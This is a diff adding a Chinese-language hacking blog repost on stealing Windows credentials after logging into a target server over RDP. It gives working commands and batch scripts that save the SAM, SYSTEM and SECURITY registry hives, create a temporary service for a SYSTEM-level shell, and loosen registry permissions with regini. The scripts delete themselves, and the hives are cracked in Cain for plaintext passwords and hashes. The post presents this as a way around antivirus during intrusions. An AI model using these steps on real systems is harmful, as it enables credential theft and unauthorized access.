@@ -1,0 +1,67 @@
+=============原文http://www.hackver.com/post-105.html==============
+         现在登录目标 3389后，我看好多人都已经习惯抓密码 HASH然后回来彩虹表破解出明文了，或者传个winloginhack来记录 3389的登录密码。在我最近的几次渗透中，发现 pwdump,fgdump这类工具现在已经不免杀了，而且这类工具都是要注入到 lsass.exe进程的，遇到 macfee这类的杀毒软件，默认是绕不过去的 。Winlogin网上放出来的，经过我的测试，对 WIN2008是没有效果的。今天浏览 BLOG，看到老外提到另一种抓系统密码 hash的技巧，经过实践，发现可行，分享给大家。
+
+       首先使用 administrator权限登录，然后使用 reg来保存注册表中 HKLM下的 SECURITY,SAM,SYSTEM,注意这里必须使用 reg的 save选项，export选项是不行的，
+reg save hklm\sam sam.hive 
+reg save hklm\system ystem.hive 
+reg save hklm\security security.hive 
+
+图1
+然后把 sam.hive,system.hive,security.hive下载回本地，打开 CAIN,在"Decoders"标签下，点"LSA Secrets", 点"+"来导入 system.hive和 security.hive. 
+这里一般就能看到管理员的明文密码了， 如图 3，当然这里的密码，有时候也是历史密码。如果尝试登录不对，可以来尝试爆破 lm/ntlm hash. 
+要破解 LM/NTLM hash，首先点"cracker"标签下的"LM&NTLM hashes",然后点"+",导入 sam.hive,注意由于现在的 win2000以后都默认使用了 syskey,所以还要导入 system.hive中的 syskey的值，然后就可以彩虹表破解了
+图5
+后话：
+这个方法不是对所有 WINDOWS发行版本都通用的，比如对 win 2000 sp4,win xp sp2就不行，对win2003,2008是管用的。具体工作列表如下：
+　　Windows 2000 SP4 (admin) = access denied
+　　Windows XP SP2 (admin) = access denied
+　　Windows XP SP3 (admin) = access denied
+　　Windows 2003 R2 SP2 (admin) = works
+　　Windows Vista SP2 (UAC/admin) = works
+　　Windows 2008 SP1 (admin) = works
+　　Windows 7 (UAC/admin) = works
+
+
+
+============注册表提权读取思路=================
+ 
+1、以下是TheLostMind的思路
+ 
+         对用户权限要求，默认XP SP3是导出不了的，我本地测试了，但是system权限是可以的，那么咱可以创建一个system权限运行的CMD，然后再导出就OK了。
+其他系统上面没测试过，大家自己整吧。
+首先创建一个系统权限执行的CMD：
+======================StartSystemCmd.bat=========
+sc Create systemcmd binPath= "cmd /K start" type= own type= interact
+sc start systemcmd
+sc delete systemcmd
+del %0
+=======================END=========================
+然后导出文件。
+==================SaveReg.bat=======================
+@echo off
+reg save hklm\sam sam.hive
+reg save hklm\system system.hive 
+reg save hklm\security security.hive
+del %0
+=====================END============================
+然后倒入到CAIN里面破吧。
+2、我的思路
+ 
+有时我们不方便再跳出一个CMD，这时可以利用命令regini.exe修改注册表的访问权限。
+首先新建一个文本文件pri.ini，内容如下：
+===========pri.ini===================
+HKEY_LOCAL_MACHINE\SECURITY [1 17]
+HKEY_LOCAL_MACHINE\SAM [1 17]
+===================================
+然后执行 regini.exe pri.ini 
+ 
+写成批处理的内容如下：
+================================
+echo HKEY_LOCAL_MACHINE\SECURITY [1 17]>pri.ini
+echo HKEY_LOCAL_MACHINE\SAM [1 17]>>pri.ini
+regini.exe pri.ini
+del pri.ini
+================================
+注：以上操作是将hklm\security与hklm\sam赋予Administrators和System完全访问的权限。hklm\system一般对管理员是放开访问的，可视情况修改。以上两个表项对系统登陆至关重要，请谨慎修改。
+ 
+最后就可以直接利用reg导出注册表内容。
